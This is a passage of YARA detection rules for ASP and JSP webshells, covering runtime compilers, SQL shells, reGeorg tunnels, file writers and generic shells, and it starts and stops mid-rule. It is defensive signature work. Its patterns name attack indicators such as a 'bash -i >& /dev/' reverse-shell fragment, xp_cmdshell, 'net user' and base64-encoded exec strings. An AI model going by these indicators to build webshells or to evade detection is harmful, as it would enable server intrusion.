                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and filesize < 300KB and
        ( $input_http or all of ( $input_form* ) ) and all of ( $exec_proc* ) and any of ( $exec_shell* )
}

rule WEBSHELL_ASP_Runtime_Compile : FILE {
    meta:
        description = "ASP webshell compiling payload in memory at runtime, e.g. sharpyshell"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "https://github.com/antonioCoco/SharPyShell"
        date = "2021/01/11"
        modified = "2023-04-05"
        score = 75
        hash = "e826c4139282818d38dcccd35c7ae6857b1d1d01"
        hash = "e20e078d9fcbb209e3733a06ad21847c5c5f0e52"
        hash = "57f758137aa3a125e4af809789f3681d1b08ee5b"
        hash = "bd75ac9a1d1f6bcb9a2c82b13ea28c0238360b3a7be909b2ed19d3c96e519d3d"
        hash = "e44058dd1f08405e59d411d37d2ebc3253e2140385fa2023f9457474031b48ee"
        hash = "f6092ab5c8d491ae43c9e1838c5fd79480055033b081945d16ff0f1aaf25e6c7"
        hash = "dfd30139e66cba45b2ad679c357a1e2f565e6b3140a17e36e29a1e5839e87c5e"
        hash = "89eac7423dbf86eb0b443d8dd14252b4208e7462ac2971c99f257876388fccf2"
        hash = "8ce4eaf111c66c2e6c08a271d849204832713f8b66aceb5dadc293b818ccca9e"
        id = "5da9318d-f542-5603-a111-5b240f566d47"
    strings:
        $payload_reflection1 = "System" fullword nocase wide ascii
        $payload_reflection2 = "Reflection" fullword nocase wide ascii
        $payload_reflection3 = "Assembly" fullword nocase wide ascii
        $payload_load_reflection1 = /[."']Load\b/ nocase wide ascii
        // only match on "load" or variable which might contain "load"
        $payload_load_reflection2 = /\bGetMethod\(("load|\w)/ nocase wide ascii
        $payload_compile1 = "GenerateInMemory" nocase wide ascii
        $payload_compile2 = "CompileAssemblyFromSource" nocase wide ascii
        $payload_invoke1 = "Invoke" fullword nocase wide ascii
        $payload_invoke2 = "CreateInstance" fullword nocase wide ascii
        $payload_xamlreader1 = "XamlReader" fullword nocase wide ascii
        $payload_xamlreader2 = "Parse" fullword nocase wide ascii
        $payload_xamlreader3 = "assembly=" nocase wide ascii
        $payload_powershell1 = "PSObject" fullword nocase wide ascii
        $payload_powershell2 = "Invoke" fullword nocase wide ascii
        $payload_powershell3 = "CreateRunspace" fullword nocase wide ascii
        $rc_fp1 = "Request.MapPath"
        $rc_fp2 = "<body><mono:MonoSamplesHeader runat=\"server\"/>" wide ascii

        //strings from private rule capa_asp_input
        // Request.BinaryRead
        // Request.Form
        $asp_input1 = "request" fullword nocase wide ascii
        $asp_input2 = "Page_Load" fullword nocase wide ascii
        // base64 of Request.Form(
        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
        $asp_input4 = "\\u0065\\u0071\\u0075" wide ascii // equ of Request
        $asp_input5 = "\\u0065\\u0073\\u0074" wide ascii // est of Request
        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
        $asp_xml_method1 = "GET" fullword wide ascii
        $asp_xml_method2 = "POST" fullword wide ascii
        $asp_xml_method3 = "HEAD" fullword wide ascii
        // dynamic form
        $asp_form1 = "<form " wide ascii
        $asp_form2 = "<Form " wide ascii
        $asp_form3 = "<FORM " wide ascii
        $asp_asp   = "<asp:" wide ascii
        $asp_text1 = ".text" wide ascii
        $asp_text2 = ".Text" wide ascii

        $sus_refl1 = " ^= " wide ascii
        $sus_refl2 = "SharPy" wide ascii

    condition:
        //any of them or
        (
            (
                filesize < 50KB and
                any of ( $sus_refl* )
            ) or
            filesize < 10KB
        ) and
        (
                any of ( $asp_input* ) or
            (
                $asp_xml_http and
                any of ( $asp_xml_method* )
            ) or
            (
                any of ( $asp_form* ) and
                any of ( $asp_text* ) and
                $asp_asp
            )
        )
        and not any of ( $rc_fp* ) and
        (
            (
                all of ( $payload_reflection* ) and
                any of ( $payload_load_reflection* )
            )
            or
            (
                all of ( $payload_compile* ) and
                any of ( $payload_invoke* )
            )
            or all of ( $payload_xamlreader* )
            or all of ( $payload_powershell* )
        )
}

rule WEBSHELL_ASP_SQL
{
    meta:
        description = "ASP webshell giving SQL access. Might also be a dual use tool."
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/03/14"
        modified = "2023-07-05"
        hash = "216c1dd950e0718e35bc4834c5abdc2229de3612"
        hash = "ffe44e9985d381261a6e80f55770833e4b78424bn"
        hash = "3d7cd32d53abc7f39faed133e0a8f95a09932b64"
        hash = "f19cc178f1cfad8601f5eea2352cdbd2d6f94e7e"
        hash = "cafc4ede15270ab3f53f007c66e82627a39f4d0f"

        id = "e534dcb9-40ab-544f-ae55-89fb21c422e9"
    strings:
        $sql1 = "SqlConnection" fullword wide ascii
        $sql2 = "SQLConnection" fullword wide ascii
        $sql3 = "System" fullword wide ascii
        $sql4 = "Data" fullword wide ascii
        $sql5 = "SqlClient" fullword wide ascii
        $sql6 = "SQLClient" fullword wide ascii
        $sql7 = "Open" fullword wide ascii
        $sql8 = "SqlCommand" fullword wide ascii
        $sql9 = "SQLCommand" fullword wide ascii

        $o_sql1 = "SQLOLEDB" fullword wide ascii
        $o_sql2 = "CreateObject" fullword wide ascii
        $o_sql3 = "open" fullword wide ascii

        $a_sql1 = "ADODB.Connection" fullword wide ascii
        $a_sql2 = "adodb.connection" fullword wide ascii
        $a_sql3 = "CreateObject" fullword wide ascii
        $a_sql4 = "createobject" fullword wide ascii
        $a_sql5 = "open" fullword wide ascii

        $c_sql1 = "System.Data.SqlClient" fullword wide ascii
        $c_sql2 = "sqlConnection" fullword wide ascii
        $c_sql3 = "open" fullword wide ascii

        $sus1 = "shell" fullword nocase wide ascii
        $sus2 = "xp_cmdshell" fullword nocase wide ascii
        $sus3 = "aspxspy" fullword nocase wide ascii
        $sus4 = "_KillMe" wide ascii
        $sus5 = "cmd.exe" fullword wide ascii
        $sus6 = "cmd /c" fullword wide ascii
        $sus7 = "net user" fullword wide ascii
        $sus8 = "\\x2D\\x3E\\x7C" wide ascii
        $sus9 = "Hacker" fullword wide ascii
        $sus10 = "hacker" fullword wide ascii
        $sus11 = "HACKER" fullword wide ascii
        $sus12 = "webshell" wide ascii
        $sus13 = "equest[\"sql\"]" wide ascii
        $sus14 = "equest(\"sql\")" wide ascii
        $sus15 = { e5 bc 80 e5 a7 8b e5 af bc e5 }
        $sus16 = "\"sqlCommand\"" wide ascii
        $sus17 = "\"sqlcommand\"" wide ascii

        //$slightly_sus1 = "select * from " wide ascii
        //$slightly_sus2 = "SELECT * FROM " wide ascii
        $slightly_sus3 = "SHOW COLUMNS FROM " wide ascii
        $slightly_sus4 = "show columns from " wide ascii


        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


        //strings from private rule capa_asp_input
        // Request.BinaryRead
        // Request.Form
        $asp_input1 = "request" fullword nocase wide ascii
        $asp_input2 = "Page_Load" fullword nocase wide ascii
        // base64 of Request.Form(
        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
        $asp_xml_method1 = "GET" fullword wide ascii
        $asp_xml_method2 = "POST" fullword wide ascii
        $asp_xml_method3 = "HEAD" fullword wide ascii
        // dynamic form
        $asp_form1 = "<form " wide ascii
        $asp_form2 = "<Form " wide ascii
        $asp_form3 = "<FORM " wide ascii
        $asp_asp   = "<asp:" wide ascii
        $asp_text1 = ".text" wide ascii
        $asp_text2 = ".Text" wide ascii

    condition:
        (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and (
            any of ( $asp_input* ) or
        (
            $asp_xml_http and
            any of ( $asp_xml_method* )
        ) or
        (
            any of ( $asp_form* ) and
            any of ( $asp_text* ) and
            $asp_asp
        )
        )
        and
        ( 6 of ( $sql* ) or all of ( $o_sql* ) or 3 of ( $a_sql* ) or all of ( $c_sql* ) ) and
        ( ( filesize < 150KB and any of ( $sus* ) ) or
        ( filesize < 5KB and any of ( $slightly_sus* ) ) )
}

rule WEBSHELL_ASP_Scan_Writable
{
    meta:
        description = "ASP webshell searching for writable directories (to hide more webshells ...)"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/03/14"
        modified = "2023-04-05"
        hash = "2409eda9047085baf12e0f1b9d0b357672f7a152"
        hash = "af1c00696243f8b062a53dad9fb8b773fa1f0395631ffe6c7decc42c47eedee7"

        id = "1766e081-0591-59ab-b546-b13207764b4d"
    strings:
        $scan1 = "DirectoryInfo" nocase fullword wide ascii
        $scan2 = "GetDirectories" nocase fullword wide ascii
        $scan3 = "Create" nocase fullword wide ascii
        $scan4 = "File" nocase fullword wide ascii
        $scan5 = "System.IO" nocase fullword wide ascii
        // two methods: check permissions or write and delete:
        $scan6 = "CanWrite" nocase fullword wide ascii
        $scan7 = "Delete" nocase fullword wide ascii


        $sus1 = "upload" nocase fullword wide ascii
        $sus2 = "shell" nocase wide ascii
        $sus3 = "orking directory" nocase fullword wide ascii
        $sus4 = "scan" nocase wide ascii


        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


        //strings from private rule capa_asp_input
        // Request.BinaryRead
        // Request.Form
        $asp_input1 = "request" fullword nocase wide ascii
        $asp_input2 = "Page_Load" fullword nocase wide ascii
        // base64 of Request.Form(
        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
        $asp_xml_method1 = "GET" fullword wide ascii
        $asp_xml_method2 = "POST" fullword wide ascii
        $asp_xml_method3 = "HEAD" fullword wide ascii
        // dynamic form
        $asp_form1 = "<form " wide ascii
        $asp_form2 = "<Form " wide ascii
        $asp_form3 = "<FORM " wide ascii
        $asp_asp   = "<asp:" wide ascii
        $asp_text1 = ".text" wide ascii
        $asp_text2 = ".Text" wide ascii

    condition:
        filesize < 10KB and (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and (
            any of ( $asp_input* ) or
        (
            $asp_xml_http and
            any of ( $asp_xml_method* )
        ) or
        (
            any of ( $asp_form* ) and
            any of ( $asp_text* ) and
            $asp_asp
        )
        )
        and 6 of ( $scan* ) and any of ( $sus* )
}

rule WEBSHELL_JSP_ReGeorg
{
    meta:
        description = "Webshell regeorg JSP version"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        reference = "https://github.com/sensepost/reGeorg"
        hash = "6db49e43722080b5cd5f07e058a073ba5248b584"
        author = "Arnim Rupp (https://github.com/ruppde)"
        date = "2021/01/24"
        modified = "2023-04-05"
        score = 75
        hash = "650eaa21f4031d7da591ebb68e9fc5ce5c860689"
        hash = "00c86bf6ce026ccfaac955840d18391fbff5c933"
        hash = "6db49e43722080b5cd5f07e058a073ba5248b584"
        hash = "9108a33058aa9a2fb6118b719c5b1318f33f0989"

        id = "cbb90005-d8f8-5c64-85d1-29e466f48c25"
    strings:
        $jgeorg1 = "request" fullword wide ascii
        $jgeorg2 = "getHeader" fullword wide ascii
        $jgeorg3 = "X-CMD" fullword wide ascii
        $jgeorg4 = "X-STATUS" fullword wide ascii
        $jgeorg5 = "socket" fullword wide ascii
        $jgeorg6 = "FORWARD" fullword wide ascii

        //strings from private rule capa_jsp_safe
        $cjsp_short1 = "<%" ascii wide
        $cjsp_short2 = "%>" wide ascii
        $cjsp_long1 = "<jsp:" ascii wide
        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp_long3 = "/jstl/core" ascii wide
        $cjsp_long4 = "<%@p" nocase ascii wide
        $cjsp_long5 = "<%@ " nocase ascii wide
        $cjsp_long6 = "<% " ascii wide
        $cjsp_long7 = "< %" ascii wide

    condition:
        filesize < 300KB and (
        $cjsp_short1 at 0 or
            any of ( $cjsp_long* ) or
            $cjsp_short2 in ( filesize-100..filesize ) or
        (
            $cjsp_short2 and (
                $cjsp_short1 in ( 0..1000 ) or
                $cjsp_short1 in ( filesize-1000..filesize )
            )
        )
        )
        and all of ( $jgeorg* )
}

rule WEBSHELL_JSP_HTTP_Proxy
{
    meta:
        description = "Webshell JSP HTTP proxy"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        hash = "2f9b647660923c5262636a5344e2665512a947a4"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/24"
        modified = "2023-07-05"
        hash = "97c1e2bf7e769d3fc94ae2fc74ac895f669102c6"
        hash = "2f9b647660923c5262636a5344e2665512a947a4"

        id = "55be246e-30a8-52ed-bc5f-507e63bbfe16"
    strings:
        $jh1 = "OutputStream" fullword wide ascii
        $jh2 = "InputStream"  wide ascii
        $jh3 = "BufferedReader" fullword wide ascii
        $jh4 = "HttpRequest" fullword wide ascii
        $jh5 = "openConnection" fullword wide ascii
        $jh6 = "getParameter" fullword wide ascii

        //strings from private rule capa_jsp_safe
        $cjsp_short1 = "<%" ascii wide
        $cjsp_short2 = "%>" wide ascii
        $cjsp_long1 = "<jsp:" ascii wide
        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp_long3 = "/jstl/core" ascii wide
        $cjsp_long4 = "<%@p" nocase ascii wide
        $cjsp_long5 = "<%@ " nocase ascii wide
        $cjsp_long6 = "<% " ascii wide
        $cjsp_long7 = "< %" ascii wide

    condition:
        filesize < 10KB and (
        $cjsp_short1 at 0 or
            any of ( $cjsp_long* ) or
            $cjsp_short2 in ( filesize-100..filesize ) or
        (
            $cjsp_short2 and (
                $cjsp_short1 in ( 0..1000 ) or
                $cjsp_short1 in ( filesize-1000..filesize )
            )
        )
        )
        and all of ( $jh* )
}

rule WEBSHELL_JSP_Writer_Nano
{
    meta:
        description = "JSP file writer"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/24"
        modified = "2023-04-05"
        hash = "ac91e5b9b9dcd373eaa9360a51aa661481ab9429"
        hash = "c718c885b5d6e29161ee8ea0acadb6e53c556513"
        hash = "9f1df0249a6a491cdd5df598d83307338daa4c43"
        hash = "5e241d9d3a045d3ade7b6ff6af6c57b149fa356e"

        id = "422a18f2-d6d4-5b42-be15-1eafe44e01cf"
    strings:
        // writting file to disk
        $payload1 = ".write" wide ascii
        $payload2 = "getBytes" fullword wide ascii
        $payload3 = ".decodeBuffer" wide ascii
        $payload4 = "FileOutputStream" fullword wide ascii

        // writting using java logging, e.g 9f1df0249a6a491cdd5df598d83307338daa4c43
        $logger1 = "getLogger" fullword ascii wide
        $logger2 = "FileHandler" fullword ascii wide
        $logger3 = "addHandler" fullword ascii wide

        //strings from private rule capa_jsp_input
        // request.getParameter
        $input1 = "getParameter" fullword ascii wide
        // request.getHeaders
        $input2 = "getHeaders" fullword ascii wide
        $input3 = "getInputStream" fullword ascii wide
        $input4 = "getReader" fullword ascii wide
        $req1 = "request" fullword ascii wide
        $req2 = "HttpServletRequest" fullword ascii wide
        $req3 = "getRequest" fullword ascii wide

        $jw_sus1 = /getParameter\("."\)/ ascii wide // one char param
        $jw_sus4 = "yoco" fullword ascii wide // webshell coder

        //strings from private rule capa_jsp_safe
        $cjsp_short1 = "<%" ascii wide
        $cjsp_short2 = "%>" wide ascii
        $cjsp_long1 = "<jsp:" ascii wide
        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp_long3 = "/jstl/core" ascii wide
        $cjsp_long4 = "<%@p" nocase ascii wide
        $cjsp_long5 = "<%@ " nocase ascii wide
        $cjsp_long6 = "<% " ascii wide
        $cjsp_long7 = "< %" ascii wide

    condition:
        //any of them or
        (
            any of ( $input* ) and
            any of ( $req* )
        ) and (
            filesize < 200 or
            (
                filesize < 1000 and
                any of ( $jw_sus* )
            )
        )
        and (
        $cjsp_short1 at 0 or
            any of ( $cjsp_long* ) or
            $cjsp_short2 in ( filesize-100..filesize ) or
        (
            $cjsp_short2 and (
                $cjsp_short1 in ( 0..1000 ) or
                $cjsp_short1 in ( filesize-1000..filesize )
            )
        )
        )
        and (
            2 of ( $payload* ) or
            all of ( $logger* )
            )
}

rule WEBSHELL_JSP_Generic_Tiny
{
    meta:
        description = "Generic JSP webshell tiny"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/07"
        modified = "2023-04-05"
        hash = "8fd343db0442136e693e745d7af1018a99b042af"
        hash = "87c3ac9b75a72187e8bc6c61f50659435dbdc4fde6ed720cebb93881ba5989d8"
        hash = "1aa6af726137bf261849c05d18d0a630d95530588832aadd5101af28acc034b5"

        id = "7535ade8-fc65-5558-a72c-cc14c3306390"
    strings:
        $payload1 = "ProcessBuilder" fullword wide ascii
        $payload2 = "URLClassLoader" fullword wide ascii
        // Runtime.getRuntime().exec(
        $payload_rt1 = "Runtime" fullword wide ascii
        $payload_rt2 = "getRuntime" fullword wide ascii
        $payload_rt3 = "exec" fullword wide ascii

        $jg_sus1 = "xe /c" ascii wide // of cmd.exe /c
        $jg_sus2 = /getParameter\("."\)/ ascii wide // one char param
        $jg_sus3 = "</pre>" ascii wide // webshells like fixed font wide
        $jg_sus4 = "BASE64Decoder" fullword ascii wide

        //strings from private rule capa_jsp_safe
        $cjsp_short1 = "<%" ascii wide
        $cjsp_short2 = "%>" wide ascii
        $cjsp_long1 = "<jsp:" ascii wide
        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp_long3 = "/jstl/core" ascii wide
        $cjsp_long4 = "<%@p" nocase ascii wide
        $cjsp_long5 = "<%@ " nocase ascii wide
        $cjsp_long6 = "<% " ascii wide
        $cjsp_long7 = "< %" ascii wide

        //strings from private rule capa_jsp_input
        // request.getParameter
        $input1 = "getParameter" fullword ascii wide
        // request.getHeaders
        $input2 = "getHeaders" fullword ascii wide
        $input3 = "getInputStream" fullword ascii wide
        $input4 = "getReader" fullword ascii wide
        $req1 = "request" fullword ascii wide
        $req2 = "HttpServletRequest" fullword ascii wide
        $req3 = "getRequest" fullword ascii wide

        // no web input but fixed command to create reverse shell
        $fixed_cmd1 = "bash -i >& /dev/" ascii wide

    condition:
        //any of them or
        (
            (
                filesize < 1000 and
                any of ( $jg_sus* )
            ) or
            filesize < 250
        ) and (
            $cjsp_short1 at 0 or
            any of ( $cjsp_long* ) or
            $cjsp_short2 in ( filesize-100..filesize ) or
        (
            $cjsp_short2 and (
                $cjsp_short1 in ( 0..1000 ) or
                $cjsp_short1 in ( filesize-1000..filesize )
            )
        )
        )
        and (
                (
                    any of ( $input* ) and
                    any of ( $req* )
                ) or (
                    any of ( $fixed_cmd* )
                )
        )
        and
        ( 1 of ( $payload* ) or all of ( $payload_rt* ) )
}

rule WEBSHELL_JSP_Generic
{
    meta:
        description = "Generic JSP webshell"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/07"
        modified = "2023-04-05"
        hash = "4762f36ca01fb9cda2ab559623d2206f401fc0b1"
        hash = "bdaf9279b3d9e07e955d0ce706d9c42e4bdf9aa1"
        hash = "ee9408eb923f2d16f606a5aaac7e16b009797a07"

        id = "7535ade8-fc65-5558-a72c-cc14c3306390"
    strings:
        $susp0 = "cmd" fullword nocase ascii wide
        $susp1 = "command" fullword nocase ascii wide
        $susp2 = "shell" fullword nocase ascii wide
        $susp3 = "download" fullword nocase ascii wide
        $susp4 = "upload" fullword nocase ascii wide
        $susp5 = "Execute" fullword nocase ascii wide
        $susp6 = "\"pwd\"" ascii wide
        $susp7 = "\"</pre>" ascii wide
        $susp8 = /\\u00\d\d\\u00\d\d\\u00\d\d\\u00\d\d/ ascii wide
        $susp9 = "*/\\u00" ascii wide // perfect match of 2 obfuscation methods: /**/\u00xx :)

        $fp1 = "command = \"cmd.exe /c set\";"

        //strings from private rule capa_bin_files
        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
        $pack  = { 50 41 43 4b 00 00 00 02 00 }

        //strings from private rule capa_jsp_safe
        $cjsp_short1 = "<%" ascii wide
        $cjsp_short2 = "%>" wide ascii
        $cjsp_long1 = "<jsp:" ascii wide
        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp_long3 = "/jstl/core" ascii wide
        $cjsp_long4 = "<%@p" nocase ascii wide
        $cjsp_long5 = "<%@ " nocase ascii wide
        $cjsp_long6 = "<% " ascii wide
        $cjsp_long7 = "< %" ascii wide

        //strings from private rule capa_jsp_input
        // request.getParameter
        $input1 = "getParameter" fullword ascii wide
        // request.getHeaders
        $input2 = "getHeaders" fullword ascii wide
        $input3 = "getInputStream" fullword ascii wide
        $input4 = "getReader" fullword ascii wide
        $req1 = "request" fullword ascii wide
        $req2 = "HttpServletRequest" fullword ascii wide
        $req3 = "getRequest" fullword ascii wide

        //strings from private rule capa_jsp_payload
        $payload1 = "ProcessBuilder" fullword ascii wide
        $payload2 = "processCmd" fullword ascii wide
        // Runtime.getRuntime().exec(
        $rt_payload1 = "Runtime" fullword ascii wide
        $rt_payload2 = "getRuntime" fullword ascii wide
        $rt_payload3 = "exec" fullword ascii wide

    condition:
        filesize < 300KB and not (
        uint16(0) == 0x5a4d or
        $dex at 0 or
        $pack at 0 or
        // fp on jar with zero compression
        uint16(0) == 0x4b50
        )
        and (
        $cjsp_short1 at 0 or
            any of ( $cjsp_long* ) or
            $cjsp_short2 in ( filesize-100..filesize ) or
        (
            $cjsp_short2 and (
                $cjsp_short1 in ( 0..1000 ) or
                $cjsp_short1 in ( filesize-1000..filesize )
            )
        )
        )
        and (
            any of ( $input* ) and
            any of ( $req* )
        )
        and (
        1 of ( $payload* ) or
        all of ( $rt_payload* )
        )
        and not any of ( $fp* ) and any of ( $susp* )
}

rule WEBSHELL_JSP_Generic_Base64
{
    meta:
        description = "Generic JSP webshell with base64 encoded payload"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/24"
        modified = "2023-04-05"
        hash = "8b5fe53f8833df3657ae2eeafb4fd101c05f0db0"
        hash = "1b916afdd415dfa4e77cecf47321fd676ba2184d"

        id = "2eabbad2-7d10-573a-9120-b9b763fa2352"
    strings:
        // Runtime
        $one1 = "SdW50aW1l" wide ascii
        $one2 = "J1bnRpbW" wide ascii
        $one3 = "UnVudGltZ" wide ascii
        $one4 = "IAdQBuAHQAaQBtAGUA" wide ascii
        $one5 = "SAHUAbgB0AGkAbQBlA" wide ascii
        $one6 = "UgB1AG4AdABpAG0AZQ" wide ascii
        // exec
        $two1 = "leGVj" wide ascii
        $two2 = "V4ZW" wide ascii
        $two3 = "ZXhlY" wide ascii
        $two4 = "UAeABlAGMA" wide ascii
        $two5 = "lAHgAZQBjA" wide ascii
        $two6 = "ZQB4AGUAYw" wide ascii
        // ScriptEngineFactory
        $three1 = "TY3JpcHRFbmdpbmVGYWN0b3J5" wide ascii
        $three2 = "NjcmlwdEVuZ2luZUZhY3Rvcn" wide ascii
        $three3 = "U2NyaXB0RW5naW5lRmFjdG9ye" wide ascii
        $three4 = "MAYwByAGkAcAB0AEUAbgBnAGkAbgBlAEYAYQBjAHQAbwByAHkA" wide ascii
        $three5 = "TAGMAcgBpAHAAdABFAG4AZwBpAG4AZQBGAGEAYwB0AG8AcgB5A" wide ascii
